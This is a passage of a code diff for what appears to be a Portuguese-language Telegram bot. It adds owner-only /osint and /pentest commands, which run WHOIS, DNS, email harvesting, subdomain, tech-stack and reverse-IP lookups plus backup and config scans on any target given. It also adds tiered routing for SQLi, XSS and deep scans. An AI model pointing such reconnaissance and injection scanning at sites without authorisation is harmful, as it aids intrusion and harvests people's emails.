+    sections.append(_clean(tool_backup_finder(url)))
+    sections.append("\n--- CONFIG ---\n" + _clean(tool_config_scanner(url)))
+
+    report = "\n".join(sections)
+    success = send_document(chat_id, report, f"pentest_{clean_target}.txt")
+    if success:
+        send_msg(user_id, chat_id, f"✅ <b>Pentest finalizado!</b>\nTarget: {escape_html(clean_target)}\n📄 Relatório pentest enviado como arquivo .txt")
+    else:
+        send_msg(user_id, chat_id, f"✅ <b>Pentest finalizado!</b>\nTarget: {escape_html(clean_target)}")
+
+
+def handle_osint(chat_id, user_id, username, first_name, last_name, args):
+    """OWNER ONLY: OSINT — Open Source Intelligence gathering on domain/IP"""
+    log_user(user_id, username, first_name, last_name)
+    if not is_owner(user_id):
+        send_msg(user_id, chat_id, "🔒 <b>Acesso negado!</b> Este comando é exclusivo dos donos.")
+        return
+    if not args:
+        send_msg(user_id, chat_id, "❌ Use: /osint &lt;domain or ip&gt;\nExemplo: /osint example.com")
+        return
+    target = args[0]
+    log_command(user_id, username, "osint", target)
+    clean_target = extract_hostname(target)
+    send_msg(user_id, chat_id, f"🕵️ <b>OWNER OSINT</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n🔍 Open Source Intelligence: DNS, WHOIS, emails, subdomains, tech, reverse IP...")
+
+    url = clean_target
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+
+    def _clean(text):
+        return re.sub(r'<[^>]+>', '', text)
+
+    sections = []
+    sections.append("═" * 60)
+    sections.append("  🕵️ OSINT INTELLIGENCE — OWNER MODE")
+    sections.append(f"  Target: {clean_target}")
+    sections.append(f"  Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    sections.append("═" * 60)
+
+    def _get_whois_text(domain):
+        """Inline WHOIS lookup"""
+        text = ""
+        try:
+            resp = _safe_get(f"https://api.allorigins.win/raw?url=https://www.whois.com/whois/{domain}", timeout=10)
+            if resp and resp.status_code == 200:
+                whois_data = resp.text
+                fields = {
+                    'Registrar': ['Registrar:', 'Registrar Name:'],
+                    'Creation Date': ['Creation Date:', 'Creation date:'],
+                    'Expiry Date': ['Registry Expiry Date:', 'Expiry Date:', 'Expiration Date:'],
+                    'Status': ['Domain Status:', 'Status:'],
+                    'Name Server': ['Name Server:', 'Nserver:'],
+                    'DNSSEC': ['DNSSEC:', 'DNSSEC:'],
+                }
+                for label, keys in fields.items():
+                    for key in keys:
+                        idx = whois_data.find(key)
+                        if idx != -1:
+                            val = whois_data[idx + len(key):].split('\n')[0].strip()
+                            if val and len(val) < 200:
+                                text += f"{label}: {val}\n"
+                                break
+            else:
+                resp2 = _safe_get(f"http://ip-api.com/json/{domain}?fields=query,status,country,isp,org,as", timeout=5)
+                if resp2 and resp2.status_code == 200:
+                    data = resp2.json()
+                    if data.get('status') == 'success':
+                        text += f"IP: {data.get('query', 'N/D')}\n"
+                        text += f"ISP: {data.get('isp', 'N/D')}\n"
+                        text += f"Org: {data.get('org', 'N/D')}\n"
+                        text += f"ASN: {data.get('as', 'N/D')}\n"
+        except Exception as e:
+            text += f"Error: {str(e)}\n"
+        return text if text.strip() else "No WHOIS data available."
+
+    # 1. WHOIS
+    send_msg(user_id, chat_id, "📋 <b>1/6 — WHOIS...</b>")
+    sections.append("\n1/6 — WHOIS REGISTRATION\n" + "-" * 40)
+    sections.append(_clean(_get_whois_text(clean_target)))
+
+    # 2. DNS Full
+    send_msg(user_id, chat_id, "📋 <b>2/6 — DNS Intelligence...</b>")
+    sections.append("\n2/6 — DNS INTELLIGENCE\n" + "-" * 40)
+    sections.append(_clean(tool_dns_tools(target)))
+
+    # 3. Emails
+    send_msg(user_id, chat_id, "📋 <b>3/6 — Email Harvesting...</b>")
+    sections.append("\n3/6 — EMAIL HARVESTING\n" + "-" * 40)
+    sections.append(_clean(tool_email_scraper(url)))
+
+    # 4. Subdomains
+    send_msg(user_id, chat_id, "📋 <b>4/6 — Subdomain Recon...</b>")
+    sections.append("\n4/6 — SUBDOMAIN RECON\n" + "-" * 40)
+    sections.append(_clean(tool_subdomain_scanner(target)))
+
+    # 5. Tech Stack
+    send_msg(user_id, chat_id, "📋 <b>5/6 — Tech Stack...</b>")
+    sections.append("\n5/6 — TECH STACK\n" + "-" * 40)
+    sections.append(_clean(tool_tech_detect(url)))
+
+    # 6. Reverse IP
+    send_msg(user_id, chat_id, "📋 <b>6/6 — Reverse IP...</b>")
+    sections.append("\n6/6 — REVERSE IP\n" + "-" * 40)
+    sections.append(_clean(tool_reverse_ip(target)))
+
+    report = "\n".join(sections)
+    success = send_document(chat_id, report, f"osint_{clean_target}.txt")
+    if success:
+        send_msg(user_id, chat_id, f"✅ <b>OSINT finalizado!</b>\nTarget: {escape_html(clean_target)}\n📄 Relatório OSINT enviado como arquivo .txt")
+    else:
+        send_msg(user_id, chat_id, f"✅ <b>OSINT finalizado!</b>\nTarget: {escape_html(clean_target)}")
+
 
 def handle_http(chat_id, user_id, username, first_name, last_name, args):
     """V5.1: HTTP Response Analysis — status, timing, redirects, tech headers"""
@@ -6875,6 +7861,10 @@ CMD_HANDLERS = {
     '/sslchain':lambda c, u, un, fn, ln, a: handle_sslchain(c, u, un, fn, ln, a),
     '/watch':   lambda c, u, un, fn, ln, a: handle_watch(c, u, un, fn, ln, a),
     '/report':  lambda c, u, un, fn, ln, a: handle_report_url(c, u, un, fn, ln, a),
+    # Owner-exclusive commands
+    '/forensic': lambda c, u, un, fn, ln, a: handle_forensic(c, u, un, fn, ln, a),
+    '/pentest':  lambda c, u, un, fn, ln, a: handle_pentest(c, u, un, fn, ln, a),
+    '/osint':    lambda c, u, un, fn, ln, a: handle_osint(c, u, un, fn, ln, a),
 }
 
 def process_update(update):
@@ -6948,6 +7938,45 @@ def process_update(update):
                     }, timeout=5)
                 except:
                     pass
+            return
+
+        # Tier selection callback: "tier:sqli:vip:example.com"
+        if cb_data.startswith('tier:'):
+            parts = cb_data.split(':', 3)
+            if len(parts) >= 4:
+                _, scan_cmd, tier, target = parts[0], parts[1], parts[2], parts[3]
+                # Route to the correct tier handler
+                if scan_cmd == 'sqli':
+                    if tier == 'vip':
+                        _run_sqli_vip(chat_id, user_id, target)
+                    elif tier == 'owner':
+                        _run_sqli_owner(chat_id, user_id, target)
+                    else:
+                        _run_sqli_normal(chat_id, user_id, target)
+                elif scan_cmd == 'xss':
+                    if tier == 'vip':
+                        _run_xss_vip(chat_id, user_id, target)
+                    elif tier == 'owner':
+                        _run_xss_owner(chat_id, user_id, target)
+                    else:
+                        _run_xss_normal(chat_id, user_id, target)
+                elif scan_cmd == 'scanall':
+                    if tier == 'vip':
+                        _run_scanall_vip(chat_id, user_id, target)
+                    elif tier == 'owner':
+                        _run_scanall_owner(chat_id, user_id, target)
+                    else:
+                        _run_scanall_normal(chat_id, user_id, target)
+                elif scan_cmd == 'deep':
+                    if tier == 'vip':
+                        _run_deep_vip(chat_id, user_id, target)
+                    elif tier == 'owner':
+                        _run_deep_owner(chat_id, user_id, target)
+                    else:
+                        _run_deep_normal(chat_id, user_id, target)
+                else:
+                    send_msg(user_id, chat_id, f"❌ Scanner /{scan_cmd} não suportado em tier mode.")
+            return
         return
 
     message = update.get('message')
